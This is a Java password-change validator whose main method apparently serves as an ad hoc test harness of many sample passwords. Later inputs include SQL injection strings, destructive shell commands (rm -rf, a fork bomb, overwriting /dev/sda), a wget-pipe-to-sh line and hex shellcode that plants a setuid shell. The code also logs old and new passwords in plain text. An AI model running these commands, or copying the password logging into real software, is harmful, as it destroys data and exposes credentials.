package com.changepassword.service;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Pattern;

public class PasswordChanger {

    private static final Logger logger = LogManager.getLogger(PasswordChanger.class);
    private static Pattern allowedCharPattern = Pattern.compile("^(?!\\d+$)([a-zA-Z0-9!@#$&*][a-zA-Z0-9!@#$&*]*)$");
    private static Pattern allowedLenghtPattern = Pattern.compile("^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*([^\\w])).+$");
    private static final int PASSWORD_MIN_LENGTH = 18;
    private static final int CHAR_REPEAT_LENGTH = 4;
    private static final int DIGIT_ALLOWED_PERCENT = 50;
    private static final int ALLOWED_MATCH_PERCENT = 80;
    private static final int SPECIAL_CHAR_REPEAT_LENGTH = 4;
    private static boolean oldPasswordSystemCheck;


    public static boolean changePassword(String oldPassword, String newPassword) {
        logger.info("In Change password for Old Password : {} and New Password : {}",oldPassword,newPassword);
        System.out.println("In Change password for Old Password :" +oldPassword + " and New Password :" + newPassword);
        boolean allowPasswordChange = false;
        if (verifyOldPassword(oldPassword) && validateNewPassword(newPassword) && withinMatchPercentLimit(oldPassword, newPassword)) {
            allowPasswordChange = true;
        }
        System.out.println("Allow password change : "+allowPasswordChange);
        logger.info("Allow password change : {}",allowPasswordChange);
        return allowPasswordChange;
    }


    private static boolean verifyOldPassword(String oldPassword) {
        if (null != oldPassword && !("".equals(oldPassword))) {
            return mockOldPasswordSystemCheck();
        } else {
            System.out.println("null or empty old password");
            logger.error("null or empty old password");
            return false;
        }

    }


    private static boolean validateNewPassword(String newPassword) {
        boolean isValid = false;
        if (null != newPassword && !("".equals(newPassword))) {
            int newPasswordLength = newPassword.length();
            if (newPasswordLength >= PASSWORD_MIN_LENGTH && isAlphaNumeric(newPassword) ) {
                Map<Character, Integer> passwordCharCount = new HashMap<Character, Integer>();
                int allowedSpecialCharCount = 0;
                int allowedDigitCount = 0;
                float digitPercentage = 0;
                boolean continueLoop = true; //change name
                for (int i = 0; i < newPasswordLength && continueLoop; i++) {
                    char thisChar = newPassword.charAt(i);
                    Integer charCount = passwordCharCount.get(thisChar);
                    if (null == charCount) {
                        passwordCharCount.put(thisChar, 1);
                    } else {
                        charCount++;
                        if (charCount > CHAR_REPEAT_LENGTH) {
                            continueLoop = false;
                            System.out.println(thisChar + " Repeate length exceeded : " + CHAR_REPEAT_LENGTH);
                            logger.error("{} Repeate length exceeded : {}",thisChar, CHAR_REPEAT_LENGTH);

                        } else {
                            passwordCharCount.put(thisChar, charCount);
                        }
                    }
                    if (Character.isDigit(thisChar)) {
                        allowedDigitCount += 1;
                        digitPercentage = (float) (allowedDigitCount * 100) / newPasswordLength;
                        /*System.out.println("Digit % : "+ digitPercentage + " : " + allowedDigitCount+"/"+newPasswordLength);
                        logger.debug("Digit % : "+ digitPercentage + " : " + allowedDigitCount+"/"+newPasswordLength);*/
                        if (digitPercentage >= DIGIT_ALLOWED_PERCENT) {
                            continueLoop = false;
                            System.out.println(thisChar + " Digit percent equal or exceeded : " + DIGIT_ALLOWED_PERCENT);
                            logger.error( "{} Digit percent equal or exceeded : {} ",thisChar,DIGIT_ALLOWED_PERCENT);
                        }
                    } else if (!(thisChar >= 'A' && thisChar <= 'Z') && !(thisChar >= 'a' && thisChar <= 'z')) {
                        allowedSpecialCharCount++;
                        /*System.out.println("Allowed Special character count : "+ allowedSpecialCharCount);
                        logger.debug("Allowed Special character count : {}",allowedSpecialCharCount);*/
                        if (allowedSpecialCharCount > SPECIAL_CHAR_REPEAT_LENGTH) {
                            continueLoop = false;
                            System.out.println(thisChar + " Allowed special character count exceeded : " + SPECIAL_CHAR_REPEAT_LENGTH);
                            logger.error("{} Allowed special character count exceeded : {}",thisChar,SPECIAL_CHAR_REPEAT_LENGTH);
                        }
                    }
                }
                System.out.println("Digit % : "+ digitPercentage + " : " + allowedDigitCount+"/"+newPasswordLength);
                logger.debug("Digit % : "+ digitPercentage + " : " + allowedDigitCount+"/"+newPasswordLength);
                System.out.println("Allowed Special character count : "+ allowedSpecialCharCount);
                logger.debug("Allowed Special character count : {}",allowedSpecialCharCount);
                System.out.println(passwordCharCount.toString());
                logger.debug(passwordCharCount.toString());
                if (continueLoop) {
                    isValid = true;
                }
            }
            else
            {
                System.out.println("condition 1 or 2 or length check failed");
                logger.error("condition 1 or 2 or length check failed");
            }
        }
        else
        {
            System.out.println("null or empty new password");
            logger.error("null or empty new password");
        }
        logger.info("New password valid status : {}", isValid);
        System.out.println("New password Valid status : " + isValid);
        return isValid;
    }

    private static boolean withinMatchPercentLimit(String oldPassword, String newPassword) {
        boolean isAllowedMatchPercent = false;
        int editDistance = EditDistance.editDistDP(oldPassword, newPassword, oldPassword.length(), newPassword.length());
        int largerStringLength = 0;
        if (oldPassword.length() >= newPassword.length()) {
            largerStringLength = oldPassword.length();
        } else {
            largerStringLength = newPassword.length();
        }
        float percentMatch = (float) ((largerStringLength - editDistance) * 100) / largerStringLength;
        if (percentMatch < ALLOWED_MATCH_PERCENT) {
            isAllowedMatchPercent = true;
            System.out.println("Percent match is < 80%");
            logger.error("Percent match is < 80%");
        }
        System.out.println("% match : " + percentMatch + " : Edit distance : " + editDistance + ": larger string length : " + largerStringLength);
        logger.debug("% match : " + percentMatch + " : Edit distance : " + editDistance + ": larger string length : " + largerStringLength);
        return isAllowedMatchPercent;
    }

    public static boolean oldPasswordSystemCheck() {
        return oldPasswordSystemCheck;
    }

    public static void setOldPasswordSystemCheck(boolean oldPasswordSystemCheck) {
        PasswordChanger.oldPasswordSystemCheck = oldPasswordSystemCheck;
    }

    private static boolean mockOldPasswordSystemCheck() {
        return oldPasswordSystemCheck();
    }

    public static boolean isAlphaNumeric(String password) {
        System.out.println("in is alpha numeric and allowed special character check");
        logger.info("in is alpha numeric and allowed special character check");
        boolean retVal = allowedCharPattern.matcher(password).find() && allowedLenghtPattern.matcher(password).find();
        if(!retVal)
        {
            logger.info("alpha numeric and allowed special character check failed");
            System.out.println("alpha numeric and allowed special character check failed");
        }
        return retVal;
    }

    public static void main(String[] args) {
        //only alpha
        /*System.out.println(isAlphaNumeric(null)); //false - null
        System.out.println(isAlphaNumeric("sdfdsfdsfdf1aA@"));  //true
        System.out.println(isAlphaNumeric("dfsdKHHKJJBKB876768678@@@@&&&&$$$")); //true
        System.out.println(isAlphaNumeric("@@@@&&&&$$$")); //true
        System.out.println(isAlphaNumeric("")); //false - empty
        System.out.println(isAlphaNumeric("          ")); //false
        System.out.println(isAlphaNumeric("!@#$&*"));
        System.out.println(isAlphaNumeric("sadsdasd3442343ASADSD!@#$&*"));
        System.out.println(isAlphaNumeric("12323sadsdasd3442343ASADSD!@#$&*"));
        System.out.println(isAlphaNumeric("!@#$&*12323sadsdasd3442343ASADSD!@#$&*"));
        System.out.println(isAlphaNumeric("12adsdasd3442343ASADSD!@#$&*"));
        System.out.println(isAlphaNumeric("121232!@#$&*"));
        System.out.println(isAlphaNumeric("121232"));
        System.out.println(isAlphaNumeric("%^()-*"));
        System.out.println(isAlphaNumeric("%^()-*123123fdfsdfsdf"));
        System.out.println(isAlphaNumeric("/n/t/b/a"));
        System.out.println(isAlphaNumeric("//n//t//b//a"));
        System.out.println(isAlphaNumeric("!@#$&*!@#$&*!@#$&*"));*/
        //System.out.println(isAlphaNumeric(null)); //false - null

        //System.out.println("null" + " : "+p.changePassword("karan", null) );
        //System.out.println("ssdfdsfdssfdf1aA@" + " : "+p.changePassword("karan", "ssdfdsfdssfdf1aA@") );
        //System.out.println("sSSSSSdfdsfdssfdf1aA@" + " : "+p.changePassword("karan", "sSSSSSdfdsfdssfdf1aA@") );
        //System.out.println("sSSSSSdfdsfdssfdf1aA@" + " : "+p.changePassword("karan", "sSSSdfdsfdssfdf1aA@@@@11111243535435454") );
        //System.out.println("sSSSSSdfdsfdssfdf1aA@" + " : "+p.changePassword("karan12K#@", "Varun44K#@1") );
        PasswordChanger p = new PasswordChanger();
        //blank new password
        PasswordChanger.setOldPasswordSystemCheck(true);
        System.out.println("" + " : " + p.changePassword("karan12K#@", ""));
        System.out.println("blank new password");
        System.out.println();
        //null new password
        System.out.println("null" + " : " + p.changePassword("karan12K#@", null));
        System.out.println("null new password");
        System.out.println();
        //only spaces in new password
        System.out.println("      " + " : " + p.changePassword("karan12K#@", "      "));
        System.out.println("only spaces in new password");
        System.out.println();
        //Leading spaces in new password
        System.out.println("    kK12@" + " : " + p.changePassword("karan12K#@", "   kK12@"));
        System.out.println("Leading spaces in new password");
        System.out.println();
        //Trailing spaces in new password
        System.out.println("kK12@   " + " : " + p.changePassword("karan12K#@", "kK12@   "));
        System.out.println("Trailing spaces in new password");
        System.out.println();
        //spaces in between a valid new password
        System.out.println("k K 1 2 @" + " : " + p.changePassword("karan12K#@", "k K 1 2 @"));
        System.out.println("spaces in between a valid new password");
        System.out.println();
        //Escape sequence in between password
        System.out.println("kK12@" + " : " + p.changePassword("karan12K#@", "\n\tkK12@"));
        System.out.println("Escape sequence in between password");
        System.out.println();

        //start with lower
        System.out.println("kK12@" + " : " + p.changePassword("karan12K#@", "kK12@"));
        System.out.println("start with lower");
        System.out.println();

        //start with upper
        System.out.println("RkK12@" + " : " + p.changePassword("karan12K#@", "RkK12@"));
        System.out.println("start with upper");
        System.out.println();

        //start with digit
        System.out.println("1RkK2@" + " : " + p.changePassword("karan12K#@", "1RkK2@"));
        System.out.println("start with digit");
        System.out.println();

        //start with special
        System.out.println("#1RkK2@" + " : " + p.changePassword("karan12K#@", "#1RkK2@"));
        System.out.println("start with special");
        System.out.println();

        //Reverse of correct old password
        System.out.println("kK12q@" + " : " + p.changePassword("@q21Kk", "kK12q@"));
        System.out.println("Reverse of correct old password");
        System.out.println();
        //new password same as old password but all upper change to lower change and vice versa
        System.out.println("kK12@q" + " : " + p.changePassword("Kk12@Q", "kK12@q"));
        System.out.println("new password same as old password but all upper change to lower change and vice versa");
        System.out.println();
        //new password <18
        //new password >18
        //new password = 18
        //all upper
        System.out.println("KK12@" + " : " + p.changePassword("Kk12@", "KK12@"));
        System.out.println("all upper");
        System.out.println();
        //all lower
        System.out.println("aa12@" + " : " + p.changePassword("Kk12@", "aa12@"));
        System.out.println("all lower");
        System.out.println();
        //only un allowed special characters
        System.out.println("%^()_+=:,.?;||~" + " : " + p.changePassword("Kk12@", "%^()_+=:,.?;||~"));
        System.out.println("only un allowed special characters");
        System.out.println();
        //only alpha upper
        System.out.println("JHJGHJBHJGGHJV" + " : " + p.changePassword("Kk12@", "JHJGHJBHJGGHJV"));
        System.out.println("only alpha upper");
        System.out.println();
        //only alpha lower
        System.out.println("ajshskndkasndksndskajn" + " : " + p.changePassword("Kk12@", "ajshskndkasndksndskajn"));
        System.out.println("only alpha lower");
        System.out.println();
        //only numeric
        System.out.println("21323124342414" + " : " + p.changePassword("Kk12@", "21323124342414"));
        System.out.println("only numeric");
        System.out.println();
        //only allowed special char
        System.out.println("!@#$&*!@#$&*" + " : " + p.changePassword("Kk12@", "!@#$&*!@#$&*"));
        System.out.println("only allowed special char");
        System.out.println();
        /*upper	lower	number	Special
        0	0	0	0
        0	0	0	1
        0	0	1	0
        0	0	1	1
        0	1	0	0
        0	1	0	1
        0	1	1	0
        0	1	1	1
        1	0	0	0
        1	0	0	1
        1	0	1	0
        1	0	1	1
        1	1	0	0
        1	1	0	1
        1	1	1	0
        1	1	1	1*/
        //none
        System.out.println("()()()())()()()" + " : " + p.changePassword("Kk12@", "()()()())()()()"));
        System.out.println("none");
        System.out.println();
        //special
        System.out.println("!@#$&*!@#$&*" + " : " + p.changePassword("Kk12@", "!@#$&*!@#$&*"));
        System.out.println("special");
        System.out.println();
        //number special
        System.out.println("42343243437878!@#$&*!@#$&*" + " : " + p.changePassword("Kk12@", "42343243437878!@#$&*!@#$&*"));
        System.out.println("number special");
        System.out.println();
        //number
        System.out.println("42343243437878" + " : " + p.changePassword("Kk12@", "42343243437878"));
        System.out.println("number");
        System.out.println();
        //lower
        System.out.println("ajshskndkasndksndskajn" + " : " + p.changePassword("Kk12@", "ajshskndkasndksndskajn"));
        System.out.println("lower");
        System.out.println();
        //lower special
        System.out.println("ajshskndkasndksndskajn!@#$&*!@#$&*" + " : " + p.changePassword("Kk12@", "ajshskndkasndksndskajn!@#$&*!@#$&*"));
        System.out.println("lower special");
        System.out.println();
        //lower number
        System.out.println("ajshskndkasndksndskajn2312321" + " : " + p.changePassword("Kk12@", "ajshskndkasndksndskajn2312321"));
        System.out.println("lower number");
        System.out.println();
        //lower number special
        System.out.println("ajshskndkasndksndskajn2312321!@#$&*!@#$&*" + " : " + p.changePassword("Kk12@", "ajshskndkasndksndskajn2312321!@#$&*!@#$&*"));
        System.out.println("lower number special");
        System.out.println();
        //upper
        System.out.println("JGJHGJHAGSHJCASGCHJS" + " : " + p.changePassword("Kk12@", "JGJHGJHAGSHJCASGCHJS"));
        System.out.println("upper");
        System.out.println();
        //upper special
        System.out.println("JGJHGJHAGSHJCASGCHJS!@#$&*!@#$&*" + " : " + p.changePassword("Kk12@", "JGJHGJHAGSHJCASGCHJS!@#$&*!@#$&*"));
        System.out.println("upper special");
        System.out.println();
        //upper number
        System.out.println("JGJHGJHAGSHJCASGCHJS7676823" + " : " + p.changePassword("Kk12@", "JGJHGJHAGSHJCASGCHJS7676823"));
        System.out.println("upper number");
        System.out.println();
        //upper number special
        System.out.println("JGJHGJHAGSHJCASGCHJS7676823!@#$&*!@#$&*" + " : " + p.changePassword("Kk12@", "JGJHGJHAGSHJCASGCHJS7676823!@#$&*!@#$&*"));
        System.out.println("upper number special");
        System.out.println();
        //upper lower
        System.out.println("JGJHGJHAGSHJCASGCHJSkjhdashdksahds" + " : " + p.changePassword("Kk12@", "JGJHGJHAGSHJCASGCHJSkjhdashdksahds"));
        System.out.println("upper lower");
        System.out.println();
        //upper lower number
        System.out.println("JGJHGJHAGSHJCASGCHJSkjhdashdksahds87343249374" + " : " + p.changePassword("Kk12@", "JGJHGJHAGSHJCASGCHJSkjhdashdksahds87343249374"));
        System.out.println("upper lower number");
        System.out.println();
        //upper lower number special
        System.out.println("KJHKJhghgh876758!@#$" + " : " + p.changePassword("Kk12@", "KJHKJhghgh876758!@#$"));
        System.out.println("upper lower number special");
        System.out.println();
        System.out.println("KJHKJhghgh876758!@#$" + " : " + p.changePassword("Kk12@", "KJHKJhghgh876758!@#$"));
        System.out.println("upper lower number special");
        System.out.println();
        //repeat upper <4
        System.out.println("KKKabcd9868966!@#$" + " : " + p.changePassword("Kk12@", "KKKabcd9868966!@#$"));
        System.out.println("repeat upper <4");
        System.out.println();
        //repeat upper =4
        System.out.println("KKKKabcd9868966!@#$" + " : " + p.changePassword("Kk12@", "KKKKabcd9868966!@#$"));
        System.out.println("repeat upper =4");
        System.out.println();
        //repeat upper >4
        System.out.println("KKKKKabcd9868966!@#$" + " : " + p.changePassword("Kk12@", "KKKKKabcd9868966!@#$"));
        System.out.println("repeat upper >4");
        System.out.println();
        //repeat lower <4
        System.out.println("1KKKaaabcd9868966!@#$" + " : " + p.changePassword("Kk12@", "1KKKaaabcd9868966!@#$"));
        System.out.println("repeat lower <4");
        System.out.println();
        //repeat lower =4
        System.out.println("2KKKaaaabcd9868966!@#$" + " : " + p.changePassword("Kk12@", "KKKaaaabcd9868966!@#$"));
        System.out.println("repeat lower =4");
        System.out.println();
        //repeat lower >4
        System.out.println("3KKKaaaaabcd9868966!@#$" + " : " + p.changePassword("Kk12@", "KKKaaaaabcd9868966!@#$"));
        System.out.println("repeat lower >4");
        System.out.println();
        //repeat number <4
        System.out.println("gKKaaabcd986866!@#$" + " : " + p.changePassword("Kk12@", "gKKaaabcd986866!@#$"));
        System.out.println("repeat number <4");
        System.out.println();
        //repeat number =4
        System.out.println("hKKaaabcd9868666!@#$" + " : " + p.changePassword("Kk12@", "hKKaaabcd9868666!@#$"));
        System.out.println("repeat number =4");
        System.out.println();
        //repeat number >4
        System.out.println("hKKaaabcd98686666!@#$" + " : " + p.changePassword("Kk12@", "hKKaaabcd98686666!@#$"));
        System.out.println("repeat number >4");
        System.out.println();
        //repeat Special char <4
        System.out.println("gKKaaabcd986866!@#$" + " : " + p.changePassword("Kk12@", "gKKaaabcd986866!!!@"));
        System.out.println("repeat Special char <4");
        System.out.println();
        //repeat Special char =4
        System.out.println("gKKaaabcd986866!@#$" + " : " + p.changePassword("Kk12@", "gKKaaabcd986866!!!!"));
        System.out.println("repeat Special char =4");
        System.out.println();
        //repeat Special char >4
        System.out.println("gKKaaabcd986866!@#$" + " : " + p.changePassword("Kk12@", "gKKaaabcd986866!!!!!"));
        System.out.println("repeat Special char >4");
        System.out.println();
        //<4 allowed special char
        System.out.println("hKKaaabcd9868666!@#" + " : " + p.changePassword("Kk12@", "hKKaaabcd9868666!@#"));
        System.out.println("<4 allowed special char");
        System.out.println();
        //=4 allowed special char
        System.out.println("hKKaaabcd9868666!@#*" + " : " + p.changePassword("Kk12@", "hKKaaabcd9868666!@#*"));
        System.out.println("=4 allowed special char");
        System.out.println();
        //>4 allowed special char
        System.out.println("hKKaaabcd9868666!@#*&" + " : " + p.changePassword("Kk12@", "hKKaaabcd9868666!@#*&"));
        System.out.println(">4 allowed special char");
        System.out.println();
        //<50% new password digit
        System.out.println("hKKaaabcd9868666!@#*1" + " : " + p.changePassword("Kk12@", "hKKaaabcd9868666!@#*1"));
        System.out.println("<50% new password digit");
        System.out.println();
        System.out.println("hKKaaabd9868666!@#*12" + " : " + p.changePassword("Kk12@", "hKKaaabd9868666!@#*12"));
        System.out.println("<50% new password digit");
        System.out.println();
        //=50% new password digit
        System.out.println("hKKaaab9868666!@#*123" + " : " + p.changePassword("Kk12@", "KKaaab9868666!@#*123"));
        System.out.println("=50% new password digit");
        System.out.println();
        //>50% new password digit
        System.out.println("hKKaab9868666!@#*1235" + " : " + p.changePassword("Kk12@", "hKKaab9868666!@#*1235"));
        System.out.println(">50% new password digit");
        System.out.println();
        //old and new password same
        System.out.println("hKKaab9868666!@#*12we" + " : " + p.changePassword("hKKaab9868666!@#*12we", "hKKaab9868666!@#*12we"));
        System.out.println("old and new password same");
        System.out.println();
        //new password palindrome of old password
        System.out.println("hKKaab9868666!@#*12we" + " : " + p.changePassword("ew21*#@!6668689baaKKh", "hKKaab9868666!@#*12we"));
        System.out.println("new password palindrome of old password");
        System.out.println();
        //95% match
        System.out.println("hKKaab9868666!@#*12we" + " : " + p.changePassword("hKKaab9868666!@#*12w", "hKKaab9868666!@#*12we"));
        System.out.println("95% match");
        System.out.println();
        //90% match
        System.out.println("hKKaab9868666!@#*12we" + " : " + p.changePassword("hKKaab9868666!@#*12", "hKKaab9868666!@#*12we"));
        System.out.println("90% match");
        System.out.println();
        //85% match
        System.out.println("hKKaab9868666!@#*12we" + " : " + p.changePassword("hKKaab9868666!@#*1", "hKKaab9868666!@#*12we"));
        System.out.println("85% match");
        System.out.println();
        //80% match
        System.out.println("hKKaab9868666!@#*12we" + " : " + p.changePassword("hKKaab9868666!@#*", "hKKaab9868666!@#*12we"));
        System.out.println("80% match");
        System.out.println();
        //<80 % match
        System.out.println("hKKaab9868666!@#*12we" + " : " + p.changePassword("hKKaab9868666!@#", "hKKaab9868666!@#*12we"));
        System.out.println("<80 % match");
        System.out.println();

        // Regex  The value must be between 0.10 and 0.90.
        System.out.println("/^0[,.]([1-8]\\d|90)$/" + " : " + p.changePassword("hKKaab9868666!@#", "/^0[,.]([1-8]\\d|90)$/"));
        System.out.println("/^0[,.]([1-8]\\d|90)$/  The value must be between 0.10 and 0.90.");
        System.out.println();

        // /^(3([.,]\d{1,2})?|4([.,]0{1,2})?)$/ : the value must be in 3 and 4, taking into account decimals.
        System.out.println("/^(3([.,]\\d{1,2})?|4([.,]0{1,2})?)$/" + " : " + p.changePassword("hKKaab9868666!@#", "/^(3([.,]\\d{1,2})?|4([.,]0{1,2})?)$/"));
        System.out.println("/^(3([.,]\\d{1,2})?|4([.,]0{1,2})?)$/ : the value must be in 3 and 4, taking into account decimals..");
        System.out.println();

        //Regex of our check condition 1
        System.out.println("^(?!\\d+$)([a-zA-Z0-9!@#$&*][a-zA-Z0-9!@#$&*]*)$" + " : " + p.changePassword("hKKaab9868666!@#", "^(?!\\d+$)([a-zA-Z0-9!@#$&*][a-zA-Z0-9!@#$&*]*)$"));
        System.out.println("Regex of our check condition 1");
        System.out.println();

        //regex of our check condition 2
        System.out.println("^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*([^\\w])).+$" + " : " + p.changePassword("hKKaab9868666!@#", "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*([^\\w])).+$"));
        System.out.println("regex of our check condition 2 ");
        System.out.println();

        //♔
        System.out.println("♔" + " : " + p.changePassword("hKKaab9868666!@#", "♔"));
        System.out.println("♔");
        System.out.println();

        // unicode characters ¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶
        System.out.println("¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶" + " : " + p.changePassword("hKKaab9868666!@#", "¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶"));
        System.out.println("¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶");
        System.out.println();

        /*' or 1=1--

        " or 1=1--

        or 1=1--

        ' or 'a'='a

        " or "a"="a

        ') or ('a'='a

        ") or ("a"="a
    */
        //SQL injection String
        System.out.println("*' or 1=1--" + " : " + p.changePassword("hKKaab9868666!@#", "*' or 1=1--"));
        System.out.println("*' or 1=1--");
        System.out.println();

        System.out.println("\" or 1=1--" + " : " + p.changePassword("hKKaab9868666!@#", "\" or 1=1--"));
        System.out.println("\" or 1=1--");
        System.out.println();

        System.out.println("or 1=1--" + " : " + p.changePassword("hKKaab9868666!@#", "or 1=1--"));
        System.out.println("or 1=1--");
        System.out.println();

        System.out.println("' or 'a'='a" + " : " + p.changePassword("hKKaab9868666!@#", "' or 'a'='a"));
        System.out.println("' or 'a'='a");
        System.out.println();

        System.out.println("\" or \"a\"=\"a" + " : " + p.changePassword("hKKaab9868666!@#", "\" or \"a\"=\"a"));
        System.out.println("\" or \"a\"=\"a");
        System.out.println();

        System.out.println("') or ('a'='a" + " : " + p.changePassword("hKKaab9868666!@#", "') or ('a'='a"));
        System.out.println("') or ('a'='a");
        System.out.println();

        System.out.println("\") or (\"a\"=\"a" + " : " + p.changePassword("hKKaab9868666!@#", "\") or (\"a\"=\"a"));
        System.out.println("\") or (\"a\"=\"a");
        System.out.println();

        //fLtPXtnLE8aa_Qak953wCg
        System.out.println("fLtPXtnLE8aa_Qak953wCg" + " : " + p.changePassword("hKKaab9868666!@#", "fLtPXtnLE8aa_Qak953wCg"));
        System.out.println("fLtPXtnLE8aa_Qak953wCg");
        System.out.println();

        //fLtPXtnLE8aaQak953wCg
        System.out.println("fLtPXtnLE8aaQak953wCg#" + " : " + p.changePassword("hKKaab9868666!@#", "fLtPXtnLE8aaQak953wCg#"));
        System.out.println("fLtPXtnLE8aaQak953wCg#");
        System.out.println();

        /*rm -rf
        The rm -rf command is one of the fastest ways to delete a folder and its contents. But a little typing error or ignorance can result in unrecoverable damage to the system. Some of the options used with the rm command are like Rm -r command deletes the folder recursively, even the empty folder. rm -f Command removes “only read the file ‘without asking. It also has the power to eliminate all files present in the root directory.
*/      //fLtPXtnLE8aaQak953wCg
        System.out.println("rm -rf *" + " : " + p.changePassword("hKKaab9868666!@#", "rm -rf *#"));
        System.out.println("rm -rf *#");
        System.out.println();

        /*: () {: |: &} ;:
        The above command is the fork bomb. It operates by defining a function called ”, which is called twice, once in the foreground and once in the background. It keeps running again and again until the system freezes.*/

        System.out.println(": () {: |: &} ;:#" + " : " + p.changePassword("hKKaab9868666!@#", ": () {: |: &} ;:#"));
        System.out.println(": () {: |: &} ;:#");
        System.out.println();

        /*command> / dev / sda
        The above command writes the output of ‘command on the block / dev / sda . The above command writes raw data and all files on the block will be replaced with raw data, resulting in total loss of data in the block.*/

        System.out.println("command> / dev / sda#" + " : " + p.changePassword("hKKaab9868666!@#", "command> / dev / sda#"));
        System.out.println("command> / dev / sda#");
        System.out.println();

        /*mv directory / dev / null
        This command basically moves all the files to / dev / null, yes, it means that it simply disappear all the files from the system.*/

        System.out.println("mv directory / dev / null#" + " : " + p.changePassword("hKKaab9868666!@#", "mv directory / dev / null#"));
        System.out.println("mv directory / dev / null#");
        System.out.println();

        /*wget http: // malicious_source -O | sh
        The above command will download a script from a malicious source and then run it on your system. The Wget command will download the script and sh command will run the downloaded script on your system.*/

        System.out.println("wget http: // malicious_source -O | sh#" + " : " + p.changePassword("hKKaab9868666!@#", "wget http: // malicious_source -O | sh#"));
        System.out.println("wget http: // malicious_source -O | sh#");
        System.out.println();

        /*invisible Command
        The following command is nothing more than the first command of this article ( rm-rf ). Here the codes are hidden in hex to an ignorant user can be fooled. Running the code below into your terminal and clear your root partition.

        This command here shows that the threat can be hidden and usually undetectable sometimes. You should be aware of what you are doing and what would be the result. Not compile / run code from an unknown source.*/

        System.out.println("char esp[] __attribute__ ((section(\\u201C.text\\u201D))) \\/* e.s.p release *\\/ = \\u201C\\\\xeb\\\\x3e\\\\x5b\\\\x31\\\\xc0\\\\x50\\\\x54\\\\x5a\\\\x83\\\\xec\\\\x64\\\\x68\\u2033 \\u201C\\\\xff\\\\xff\\\\xff\\\\xff\\\\x68\\\\xdf\\\\xd0\\\\xdf\\\\xd9\\\\x68\\\\x8d\\\\x99\\u2033 \\u201C\\\\xdf\\\\x81\\\\x68\\\\x8d\\\\x92\\\\xdf\\\\xd2\\\\x54\\\\x5e\\\\xf7\\\\x16\\\\xf7\\u2033 \\u201C\\\\x56\\\\x04\\\\xf7\\\\x56\\\\x08\\\\xf7\\\\x56\\\\x0c\\\\x83\\\\xc4\\\\x74\\\\x56\\u2033 \\u201C\\\\x8d\\\\x73\\\\x08\\\\x56\\\\x53\\\\x54\\\\x59\\\\xb0\\\\x0b\\\\xcd\\\\x80\\\\x31\\u2033 \\u201C\\\\xc0\\\\x40\\\\xeb\\\\xf9\\\\xe8\\\\xbd\\\\xff\\\\xff\\\\xff\\\\x2f\\\\x62\\\\x69\\u2033 \\u201C\\\\x6e\\\\x2f\\\\x73\\\\x68\\\\x00\\\\x2d\\\\x63\\\\x00\\u2033 \\u201Ccp -p \\/bin\\/sh \\/tmp\\/.beyond; chmod 4755 \\/tmp\\/.beyond;\\u201D;#" + " : " + p.changePassword("hKKaab9868666!@#", "char esp[] __attribute__ ((section(\\u201C.text\\u201D))) \\/* e.s.p release *\\/ = \\u201C\\\\xeb\\\\x3e\\\\x5b\\\\x31\\\\xc0\\\\x50\\\\x54\\\\x5a\\\\x83\\\\xec\\\\x64\\\\x68\\u2033 \\u201C\\\\xff\\\\xff\\\\xff\\\\xff\\\\x68\\\\xdf\\\\xd0\\\\xdf\\\\xd9\\\\x68\\\\x8d\\\\x99\\u2033 \\u201C\\\\xdf\\\\x81\\\\x68\\\\x8d\\\\x92\\\\xdf\\\\xd2\\\\x54\\\\x5e\\\\xf7\\\\x16\\\\xf7\\u2033 \\u201C\\\\x56\\\\x04\\\\xf7\\\\x56\\\\x08\\\\xf7\\\\x56\\\\x0c\\\\x83\\\\xc4\\\\x74\\\\x56\\u2033 \\u201C\\\\x8d\\\\x73\\\\x08\\\\x56\\\\x53\\\\x54\\\\x59\\\\xb0\\\\x0b\\\\xcd\\\\x80\\\\x31\\u2033 \\u201C\\\\xc0\\\\x40\\\\xeb\\\\xf9\\\\xe8\\\\xbd\\\\xff\\\\xff\\\\xff\\\\x2f\\\\x62\\\\x69\\u2033 \\u201C\\\\x6e\\\\x2f\\\\x73\\\\x68\\\\x00\\\\x2d\\\\x63\\\\x00\\u2033 \\u201Ccp -p \\/bin\\/sh \\/tmp\\/.beyond; chmod 4755 \\/tmp\\/.beyond;\\u201D;#"));
        System.out.println("char esp[] __attribute__ ((section(\\u201C.text\\u201D))) \\/* e.s.p release *\\/ = \\u201C\\\\xeb\\\\x3e\\\\x5b\\\\x31\\\\xc0\\\\x50\\\\x54\\\\x5a\\\\x83\\\\xec\\\\x64\\\\x68\\u2033 \\u201C\\\\xff\\\\xff\\\\xff\\\\xff\\\\x68\\\\xdf\\\\xd0\\\\xdf\\\\xd9\\\\x68\\\\x8d\\\\x99\\u2033 \\u201C\\\\xdf\\\\x81\\\\x68\\\\x8d\\\\x92\\\\xdf\\\\xd2\\\\x54\\\\x5e\\\\xf7\\\\x16\\\\xf7\\u2033 \\u201C\\\\x56\\\\x04\\\\xf7\\\\x56\\\\x08\\\\xf7\\\\x56\\\\x0c\\\\x83\\\\xc4\\\\x74\\\\x56\\u2033 \\u201C\\\\x8d\\\\x73\\\\x08\\\\x56\\\\x53\\\\x54\\\\x59\\\\xb0\\\\x0b\\\\xcd\\\\x80\\\\x31\\u2033 \\u201C\\\\xc0\\\\x40\\\\xeb\\\\xf9\\\\xe8\\\\xbd\\\\xff\\\\xff\\\\xff\\\\x2f\\\\x62\\\\x69\\u2033 \\u201C\\\\x6e\\\\x2f\\\\x73\\\\x68\\\\x00\\\\x2d\\\\x63\\\\x00\\u2033 \\u201Ccp -p \\/bin\\/sh \\/tmp\\/.beyond; chmod 4755 \\/tmp\\/.beyond;\\u201D;#");
        System.out.println();

        /*<title>Example document: %(title)</title>
        is intended to illustrate a template snippet that, if the variable title has value Cross-Site Scripting, results in the following HTML to be emitted to the browser:*/

        System.out.println("<title>Example document: %(title)</title>" + " : " + p.changePassword("hKKaab9868666!@#", "<title>Example document: %(title)</title>"));
        System.out.println("<title>Example document: %(title)</title>");
        System.out.println();

        /*<title>Example document: XSS Doc</title>
        A site containing a search field does not have the proper input sanitizing. By crafting a search query looking something like this:*/

